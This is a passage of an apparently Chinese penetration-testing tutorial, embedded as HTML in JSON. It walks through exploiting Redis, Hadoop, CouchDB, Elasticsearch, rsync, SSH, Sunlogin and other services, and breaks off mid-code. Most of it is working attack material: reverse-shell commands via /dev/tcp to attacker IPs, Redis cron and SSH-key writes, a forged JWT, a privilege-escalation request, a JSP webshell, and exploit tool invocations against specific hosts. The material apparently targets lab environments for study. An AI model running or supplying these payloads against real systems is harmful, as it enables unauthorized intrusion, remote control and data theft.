            "content_html": "<h3 id=\"数据库安全\"><a class=\"markdownIt-Anchor\" href=\"#数据库安全\">#</a> 数据库安全</h3>\n<p>注意各种漏洞的产生都与其版本和其相关配置是否安全有关</p>\n<h4 id=\"mysql-未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#mysql-未授权访问\">#</a> mysql 未授权访问</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CVE-2012-2122 利用</span> </span><br><span class=\"line\">for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done </span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过此漏洞不断的访问 mysql，最终可以无需认证进入数据库，但 是这个是很早之前的漏洞了，基本上已经销声匿迹了。</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"hadoop未授权-rce\"><a class=\"markdownIt-Anchor\" href=\"#hadoop未授权-rce\">#</a> hadoop 未授权 RCE</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">target = &#x27;http://123.58.236.76:31361/&#x27;</span><br><span class=\"line\">lhost = &#x27;47.94.236.117&#x27; # put your local host ip here, and listen at port 9999</span><br><span class=\"line\">url = target + &#x27;ws/v1/cluster/apps/new-application&#x27;</span><br><span class=\"line\">resp = requests.post(url)</span><br><span class=\"line\">app_id = resp.json()[&#x27;application-id&#x27;]</span><br><span class=\"line\">url = target + &#x27;ws/v1/cluster/apps&#x27;</span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">  &#x27;application-id&#x27;: app_id,</span><br><span class=\"line\">  &#x27;application-name&#x27;: &#x27;get-shell&#x27;,</span><br><span class=\"line\">  &#x27;am-container-spec&#x27;: &#123;</span><br><span class=\"line\">    &#x27;commands&#x27;: &#123;</span><br><span class=\"line\">      &#x27;command&#x27;: &#x27;/bin/bash -i &gt; &amp; /dev/tcp/%s/9999 0 &gt; &amp;1&#x27; % lhost,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">  &#x27;application-type&#x27;: &#x27;YARN&#x27;,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>\n<h4 id=\"redis-写定时-写公钥\"><a class=\"markdownIt-Anchor\" href=\"#redis-写定时-写公钥\">#</a> redis 写定时 写公钥</h4>\n<ul>\n<li>redis 写 Webshell</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用条件：Web目录权限可读写，需得到Web路径:</span></span><br><span class=\"line\">config set dir /tmp #设置WEB写入目录</span><br><span class=\"line\">config set dbfilename 1.php #设置写入文件名</span><br><span class=\"line\">set test &quot;&lt;?php phpinfo();?&gt;&quot; #设置写入文件代码</span><br><span class=\"line\">bgsave #保存执行</span><br><span class=\"line\">save #保存执行</span><br></pre></td></tr></table></figure>\n<ul>\n<li>写定时任务反弹 shell:</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用条件：允许异地登录，安全模式protected-mode处于关闭状态</span></span><br><span class=\"line\">config set dir /var/spool/cron</span><br><span class=\"line\">set yy &quot;\\n\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/47.94.236.117/5555 0&gt;&amp;1\\n\\n\\n&quot;</span><br><span class=\"line\">config set dbfilename reverse_shell</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<ul>\n<li>写入 Linux ssh-key 公钥</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用条件：允许异地登录，Redis服务使用ROOT账号启动，安全模式protected-mode处于关闭状态，允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</span></span><br><span class=\"line\">ssh-keygen -t rsa</span><br><span class=\"line\">echo -e &quot;\\n\\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\\n\\n&quot; &gt; /root/.ssh/key.txt</span><br><span class=\"line\">cat /root/.ssh/key.txt | redis-cli -h 118.31.57.214 -x set xxx</span><br><span class=\"line\">config set dir /root/.ssh/</span><br><span class=\"line\">config set dbfilename authorized_keys</span><br><span class=\"line\">save</span><br><span class=\"line\">ssh -i /root/.ssh/id_rsa root@118.31.57.214</span><br></pre></td></tr></table></figure>\n<ul>\n<li>RCE 自动化利用脚本</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">https://github.com/vulhub/redis-rogue-getshell</span></span><br><span class=\"line\">python redis-master.py -r 123.58.236.76 -p 11820 -L 47.94.236.117 -P 8888 -f RedisModulesSDK/exp.so -c &quot;id&quot;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>沙箱绕过 RCE CVE-2022-0543 ：</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">https://github.com/aodsec/CVE-2022-0543</span></span><br><span class=\"line\">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">此漏洞较新，当确认有 redis未授权时，用redis-cli连接进来，可以直接执行系统命令</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"influxdb-jwt伪造身份\"><a class=\"markdownIt-Anchor\" href=\"#influxdb-jwt伪造身份\">#</a> influxdb jwt 伪造身份</h4>\n<p>influxdb 是一款著名的时序数据库，其使用 jwt 作为鉴权方式。在用户开启 了认证，但未设置参数 shared-secret 的情况下，jwt 的认证密钥为空字符串，此 时攻击者可以伪造任意用户身份在 influxdb 中执行 SQL 语句。</p>\n<p>漏洞复现地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2luZmx1eGRiL3VuYWNjLw==\">https://vulhub.org/#/environments/influxdb/unacc/</span></p>\n<p>环境启动后，访问 <span class=\"exturl\" data-url=\"aHR0cDovL3lvdXItaXA6ODA4Ni9kZWJ1Zy92YXJz\">http://your-ip:8086/debug/vars</span> 即可查看一些服务信息，但此时执行 SQL 语句则会出现 401 错误：其中，admin 是一个已经存在的用户， exp 是一个时间戳，代表着这个 token 的过期时间，设置为一个未来的时间戳。借助 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9qd3QuaW8vJUU2JTlEJUE1JUU3JTk0JTlGJUU2JTg4JTkw\">https://jwt.io/ 来生成</span> jwt token:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class=\"line\">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class=\"line\">  &quot;exp&quot;: 1676346267 </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将空密钥生成的jwt代入到数据包中进行发送：</span></span><br><span class=\"line\">Authorization: Bearer</span><br><span class=\"line\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A</span><br><span class=\"line\">db=sample&amp;q=show+users</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">可以尝试查询一些敏感数据，后期是否能得到更高的系统权限需要看这个是否支持，否则的话就是只能读取数据。</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"h2-database-jndi注入\"><a class=\"markdownIt-Anchor\" href=\"#h2-database-jndi注入\">#</a> h2 database jndi 注入</h4>\n<p>H2 database 是一款 Java 内存数据库，多用于单元测试。H2 database 自带一个 Web 管理页面，在 Spirng 开发中，如果我们设置如下选项，即可允许外部用户访问 Web 管理页面，且没有鉴权。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">spring.h2.console.enabled=true</span><br><span class=\"line\">spring.h2.console.settings.web-allow-others=true</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用这个页面，我们可以进行 JNDI 注入攻击，进而在目标环境下执行任意命令。</span> </span><br></pre></td></tr></table></figure>\n<p>漏洞链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvaDJkYXRhYmFzZS9oMi1jb25zb2xlLXVuYWNjL1JFQURNRS56aC1jbi5tZA==\">https://github.com/vulhub/vulhub/blob/master/h2database/h2-console-unacc/README.zh-cn.md</span></p>\n<p>启动后，访问 <span class=\"exturl\" data-url=\"aHR0cDovL3lvdXItaXA6ODA4MC9oMi1jb25zb2xlLyVFNSU4RCVCMyVFNSU4RiVBRiVFNiU5RiVBNSVFNyU5QyU4QiVFNSU4OCVCMA==\">http://your-ip:8080/h2-console / 即可查看到</span> H2 database 的管理 页面。可以借助这个小工具 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pvc2VwaFRyaWJiaWFubmkvSk5ESQ==\">https://github.com/JosephTribbianni/JNDI</span> 简化我们的复现过程。</p>\n<p>首先设置 JNDI 工具中执行的命令为 touch /tmp/success, 然后启动 JNDI-1.0-all.jar，在 h2 console 页面填入 JNDI 类名和 URL 地址：其中，javax.naming. InitialContext 是 JNDI 的工厂类，URL rmi://evil:23456/BypassByEL 是运行 JNDI 工具监听的 RMI 地址。点击连接后，恶意 RMI 成功接收到请求:touch /tmp/success 已成功执行。</p>\n<h4 id=\"couchdb-纵向权限\"><a class=\"markdownIt-Anchor\" href=\"#couchdb-纵向权限\">#</a> Couchdb 纵向权限</h4>\n<p>Apache CouchDB，使用语言用于一个性并成为 “一个完全方便 web 的数据 库”。它是一个使用 JSON 作为存储格式，JavaScript 查询，MapReduce 和 HTTPBBC 作为 API 的 NoSQL 数据库。它应用很广泛，如用在其动态展示平台， Credit Suisse 用在其商品的市场框架，Meebo，用在其内部社交内容平台 (网络 和应用程序)。</p>\n<p>在 2017 年 11 月 15 日，CVE-2017-12635 和 CVE-2017-12636，CVE-2017-12635 可能是由于 Erlang 和 JavaScript 对 JSON 解析方式的不同，导致 语句执行产生差异性导致的。让任意权限管理员，属于不同权限的用户创建权限。影响版本: &lt; 1.7.0 以及 &lt; 2.1.1</p>\n<p>漏洞链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvY291Y2hkYi9DVkUtMjAxNy0xMjYzNS9SRUFETUUuemgtY24ubWQ=\">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12635/README.zh-cn.md</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">发送包含两个约束的数据包：</span></span><br><span class=\"line\">PUT /_users/org.couchdb.user:vulhub HTTP/1.1</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;type&quot;: &quot;user&quot;,</span><br><span class=\"line\">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class=\"line\">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class=\"line\">  &quot;roles&quot;: [],</span><br><span class=\"line\">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">成功创建管理员，密码密码vulhub，再次访问http://your-ip:5984/_utils/，输入账户密码vulhub，可以成功登录。</span></span><br></pre></td></tr></table></figure>\n<p>Couchdb 任意命令执行漏洞的复现地址（直接用脚本完成就可以）:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvY291Y2hkYi9DVkUtMjAxNy0xMjYzNi9SRUFETUUuemgtY24ubWQ=\">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/README.zh-cn.md</span></p>\n<h4 id=\"es-写-webshell\"><a class=\"markdownIt-Anchor\" href=\"#es-写-webshell\">#</a> es 写 webshell</h4>\n<p>ElasticSearch 具有备份数据的功能，用户可以传入一个路径，让其将数据备 份到该路径下，且文件名和后缀都可控。所以，如果同文件系统下还跑着其他<br>\n服务，如 Tomcat、PHP 等，可以利用 ElasticSearch 的备份功能写入一个 webshell。</p>\n<p>漏洞链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2VsYXN0aWNzZWFyY2gvV29vWXVuLTIwMTUtMTEwMjE2Lw==\">https://vulhub.org/#/environments/elasticsearch/WooYun-2015-110216/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">首先创建一个恶意索引文档：</span></span><br><span class=\"line\">curl -X POST [http://127.0.0.1:9200/yz.jsp/yz.jsp/1](http://127.0.0.1:9200/yz.jsp/yz.jsp/1) -d&#x27;</span><br><span class=\"line\">&#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.get Parameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;</span><br><span class=\"line\">&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">再创建一个恶意的存储库，其中location的值即为我要写入的路径。</span></span><br><span class=\"line\">curl -X PUT &#x27;http://127.0.0.1:9200/_snapshot/yz.jsp&#x27; -d &#x27;&#123;</span><br><span class=\"line\">  &quot;type&quot;: &quot;fs&quot;,</span><br><span class=\"line\">  &quot;settings&quot;: &#123;</span><br><span class=\"line\">    &quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot/&quot;,</span><br><span class=\"line\">    &quot;compress&quot;: false</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">存储库验证并创建:</span></span><br><span class=\"line\">curl -X PUT &quot;http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &#x27;&#123;</span><br><span class=\"line\">  &quot;indices&quot;: &quot;yz.jsp&quot;,</span><br><span class=\"line\">  &quot;ignore_unavailable&quot;: &quot;true&quot;,</span><br><span class=\"line\">  &quot;include_global_state&quot;: false</span><br><span class=\"line\">&#125;&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">访问http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp，这就是我们写入的webshell。该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串，如：http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success，我们再访问/wwwroot/test.jsp就能看到success了。</span></span><br></pre></td></tr></table></figure>\n<p>其他 elasticSearch 漏洞：<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2VsYXN0aWNzZWFyY2g=\">https://vulhub.org/#/environments/elasticsearch</span></p>\n<h3 id=\"应用协议\"><a class=\"markdownIt-Anchor\" href=\"#应用协议\">#</a> 应用协议</h3>\n<h4 id=\"ftp匿名登录\"><a class=\"markdownIt-Anchor\" href=\"#ftp匿名登录\">#</a> ftp 匿名登录</h4>\n<ul>\n<li>FTP 的匿名登录一般有三种</li>\n</ul>\n<p>用户名：anonymous 密码：Email 或者为空</p>\n<p>用户名：FTP 密码：FTP 或者为空</p>\n<p>用户名：USER 密码：pass</p>\n<p>++ 此外 ftp 还可以用 hydra 进行爆破，知道账户 / 密码时候爆破效率更好</p>\n<ul>\n<li>Proftpd 协议漏洞</li>\n</ul>\n<p>漏洞链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Qwa3gvZXhwbG9pdC1DVkUtMjAxNS0zMzA2\">https://github.com/t0kx/exploit-CVE-2015-3306</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python exploit.py --host 123.58.236.76 --port 24967 --path &quot;/var/www/html/&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">http://123.58.236.76:19758/backdoor.php?cmd=<span class=\"built_in\">id</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">遇到这些漏洞时需要自行寻找对应版本的进行漏洞验证</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"rsync-未授权-rce\"><a class=\"markdownIt-Anchor\" href=\"#rsync-未授权-rce\">#</a> rsync 未授权 RCE</h4>\n<p>rsync 是 Linux 下一款数据备份工具，支持通过 rsync 协议、ssh 协议进行远程文件传输。其中 rsync 协议默认监听 873 端口，如果目标开启了 rsync 服务，并且没有配置 ACL 或访问密码，我们将可以读写目标服务器文件。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">判断</span></span><br><span class=\"line\">rsync rsync://123.58.236.76:45854/</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">读取文件</span></span><br><span class=\"line\">rsync rsync://123.58.236.76:45854/src/</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下载文件</span></span><br><span class=\"line\">rsync rsync://123.58.236.76:45854/src/etc/passwd ./</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">上传文件</span></span><br><span class=\"line\">rsync -av passwd rsync://123.58.236.76:45854/src/tmp/passwd</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取信息</span></span><br><span class=\"line\">rsync rsync://123.58.236.76:12177/src/etc/crontab /root/cron.txt</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">写入反弹shell的代码</span></span><br><span class=\"line\">echo -e &quot;#! /bin/bash\\nbash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.83/4444 0&gt;&amp;1&#x27;&quot; &gt; /tmp/shell.sh ; chmod +x shell</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">上传文件</span></span><br><span class=\"line\">rsync -av shell rsync://123.58.236.76:12177/src/etc/cron.hourly</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">监听端口等待接受反弹</span></span><br><span class=\"line\">nc -lvvp 4444</span><br></pre></td></tr></table></figure>\n<p><strong>msf 和 fofaviewer 批量测试</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">fofa_viewer: https://github.com/wgpsec/fofa_viewer</span></span><br><span class=\"line\">msfconsole</span><br><span class=\"line\">use auxiliary/scanner/rsync/modules_list</span><br><span class=\"line\">set rhosts file:/root/ips.txt</span><br><span class=\"line\">set threads 10</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<h4 id=\"ssh枚举-libssh认证绕过\"><a class=\"markdownIt-Anchor\" href=\"#ssh枚举-libssh认证绕过\">#</a> ssh 枚举 libssh 认证绕过</h4>\n<p>（1）SSH 协议漏洞:</p>\n<p>CVE-2014-0160 版本很少，都被修复了；CVE_2020_15778 价值不高。</p>\n<p>OpenSSH 8.3p1 及之前版本中的 scp 的 scp.c 文件存在操作系统命令注入漏洞。该漏洞即使在禁用 ssh 登录的情况下，但是允许使用 scp 传文件，而且远程服务器允许使用反引号 (`)，可利用 scp 复制文件到远程服务器时，执行带有 payload 的 scp 命令，从而在后续利用中 getshell。需要漏洞版本 &lt;= openssh-8.3p1，作用是通过 scp 来连接已知用户名密码的系统。</p>\n<p>CVE-2018-15473 - 用户名枚举</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">https://github.com/Rhynorater/CVE-2018-15473-Exploit</span></span><br><span class=\"line\"></span><br><span class=\"line\">pip3 install -r requirements.txt</span><br><span class=\"line\">pip3 install paramiko==2.4.1</span><br><span class=\"line\">python sshUsernameEnum.py --port 32013 --userList exampleInput.txt 123.58.236.76 作用是通过字典来判断对方 ssh 有没有与这个字典里匹配的用户名。</span><br></pre></td></tr></table></figure>\n<p>（2）libssh 服务端权限认证绕过漏洞 (CVE-2018-10933)<br>\n libssh 是一个提供 ssh 相关接口的开源库，包含服务端、客户端等。其服务 端代码中存在一处逻辑错误，攻击者可以在认证成功前发送 MSG_USERAUTH _SUCCESS 消息，绕过认证过程，未授权访问目标 SSH 服务器。</p>\n<p>环境启动后，我们可以连接 your-ip:2222 端口 (账号密码: myuser:mypassword)，这是一个合法的 ssh 流程。参考 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VlYnVnLm9yZy8=\">https://www.seebug.org/</span><br>\nvuldb/ssvid-97614 中给出的 POC，使用 python3 执行，即可在目标服务器上 RCE。</p>\n<p>漏洞链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvbGlic3NoL0NWRS0yMDE4LTEwOTMzL1JFQURNRS56aC1jbi5tZA==\">https://github.com/vulhub/vulhub/blob/master/libssh/CVE-2018-10933/README.zh-cn.md</span></p>\n<h4 id=\"向日葵rce-vnc口令\"><a class=\"markdownIt-Anchor\" href=\"#向日葵rce-vnc口令\">#</a> 向日葵 RCE、vnc 口令</h4>\n<p>（1）向日葵 RCE：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">https://github.com/Mr-xn/sunlogin_rce</span></span><br><span class=\"line\">xrkRce.exe -h 192.168.46.157 -t scan</span><br><span class=\"line\">xrkRce.exe -h 192.168.46.157 -t rce -p 49712 -c &quot;ipconfig&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">扫描到端口后，针对特定版本进行命令执行操作，可直接反弹shell；可利用nc或者powershell或者其他目标上存在的程序进行反弹shell</span></span><br></pre></td></tr></table></figure>\n<p>（2）VNC 口令问题：</p>\n<p>可能未设置密码导致的未授权访问，也可以通过 msf 猜解密码爆破 vnc</p>\n<h4 id=\"teamviewer-xss攻击\"><a class=\"markdownIt-Anchor\" href=\"#teamviewer-xss攻击\">#</a> teamviewer xss 攻击</h4>\n<p>通过网页调用除了命令执行，可以执行任意命令，配合 XSS 或者钓鱼使用，当发现对方是特定版本的 teamviewer 时，诱使对方访问构造好的 url 链接。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span> &gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span> cve-2020-13699 <span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span 